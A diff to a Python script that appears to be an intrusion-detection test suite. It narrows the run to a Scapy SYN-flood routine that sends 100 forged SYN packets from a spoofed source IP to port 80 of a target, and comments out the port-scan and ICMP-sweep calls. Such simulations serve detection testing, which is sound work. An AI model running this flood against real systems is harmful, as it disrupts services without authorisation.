@@ -9,8 +9,9 @@ def simulate_syn_flood():
     print("[*] Starting SYN Flood Simulation...")
 
     for i in range(100):
-        src_ip = f"192.168.1.{random.randint(2, 200)}"
-        dst_port = random.randint(20, 5000)
+        #src_ip = f"192.168.1.{random.randint(2, 200)}"
+        src_ip = f"192.168.1.9"
+        dst_port = 80
 
         packet = IP(src=src_ip, dst=TARGET_IP) / TCP(dport=dst_port, flags="S")
         send(packet, verbose=False)
@@ -56,13 +57,13 @@ if __name__ == "__main__":
     print("Launching IDS Attack Simulation Suite")
     print("=" * 60)
 
-    simulate_port_scan()
-    time.sleep(2)
+    #simulate_port_scan()
+    #time.sleep(2)
 
     simulate_syn_flood()
     time.sleep(2)
 
-    simulate_icmp_sweep()
+    #simulate_icmp_sweep()
 
     print("=" * 60)
     print("All attack simulations completed successfully.")
